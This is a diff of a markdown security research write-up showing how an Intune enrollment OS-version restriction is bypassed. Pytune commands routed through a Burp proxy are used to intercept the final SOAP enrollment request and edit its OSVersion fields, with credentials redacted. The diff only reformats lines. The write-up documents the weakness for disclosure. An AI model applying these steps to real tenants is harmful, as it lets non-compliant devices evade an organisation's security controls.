@@ -7,15 +7,21 @@ This research was completed during my internship at Bureau Veritas Cybersecurity
 ## Prerequisites
 [Pytune](https://github.com/secureworks/pytune) was used to simulate the enrollment process and create repeatable traffic. To observe the enrollment flow, the traffic was proxied by using the proxy option (-x):
 ```
-python3 pytune.py -x http://localhost:[port] entra_join -o Windows -d Example -u Example@[REDACTED] -p [REDACTED]
+python3 pytune.py -x http://localhost:[port] entra_join -o Windows 
+-d Example -u Example@[REDACTED] -p [REDACTED]
 ```
 I used Burp Suite Community Edition as the proxy. When the proxy is enabled, enrollment traffic appears under the Proxy tab and can be intercepted like browser traffic:
+
 ![alt text](EnrollmentStepsSC-1.png)
 
 ## Enrollment process context
 The enrollment flow for Windows endpoints consists of 12 requests. The first 2 requests complete the Entra device registration and return the tenant-specific metadata needed to continue the Intune enrollment. The remaining requests prepare the enrollment by retrieving the necessary service endpoints (e.g. MS Graph & Win32 API).
 
 The 12th request is the enrollment boundary. Its SOAP-body contains the certificate signing request and an `<AdditionalContext>` block that includes device context values such as device identifiers and OS version fields. If the service accepts that request, it returns an MDM certificate for the endpoint.
+
+
+
+
 ```
 ...
 <ac:AdditionalContext xmlns="http://schemas.xmlsoap.org/ws/2006/12/authorization">
@@ -45,7 +51,8 @@ For this POC the OS version was set to a purposely vulnerable OS version: “6.1
 In the PoC, the key change is that the OS version presented to the enrollment service, during the final enrollment request, is intercepted and modified using Burpsuite as follows:
 1. Start the enrollment
 ```
-python3 pytune.py -x http://localhost:8080 entra_join -o Windows -d Example -u Example@[REDACTED] -p [REDACTED]
+python3 pytune.py -x http://localhost:8080 entra_join -o Windows 
+-d Example -u Example@[REDACTED] -p [REDACTED]
 ```
 2. Pytune now starts the enrollment using its newly configured default Windows credentials `"DeviceType":"Windows"` and `"OSVersion":"6.1.7601.17514"`
 3. The enrollment is not stopped at the Entra join phase, because Intune enrollment restrictions do not apply there.
@@ -68,10 +75,10 @@ Content-Length: 8306
                         <ac:Value>CIMClient_Windows</ac:Value>
                     </ac:ContextItem>
                     <ac:ContextItem Name="OSVersion">
-                        <ac:Value>6.1.7601.17514</ac:Value>            <-------------- This value should be changed to an acceptable build
+                        <ac:Value>6.1.7601.17514</ac:Value>   <-- This value should be changed to an acceptable build
                     </ac:ContextItem>
                     <ac:ContextItem Name="ApplicationVersion">
-                        <ac:Value>6.1.7601.17514</ac:Value>            <-------------- This value should be changed to an acceptable build
+                        <ac:Value>6.1.7601.17514</ac:Value>  <-- This value should be changed to an acceptable build
                     </ac:ContextItem>
                 </ac:AdditionalContext>
             </wst:RequestSecurityToken>
@@ -85,7 +92,8 @@ Content-Length: 8306
 
 7. The final step is performing a check-in, to sync device information to the back-end and portal:
 ```
-python3 pytune.py -x checkin -o Windows -d Example -c Example.pfx -m Example_mdm.pfx -u Example@[REDACTED] -p [REDACTED]
+python3 pytune.py -x checkin -o Windows -d Example 
+-c Example.pfx -m Example_mdm.pfx -u Example@[REDACTED] -p [REDACTED]
 ```
 ### Result
 And the device appears enrolled and compliant, while clearly not having an acceptable OS version:
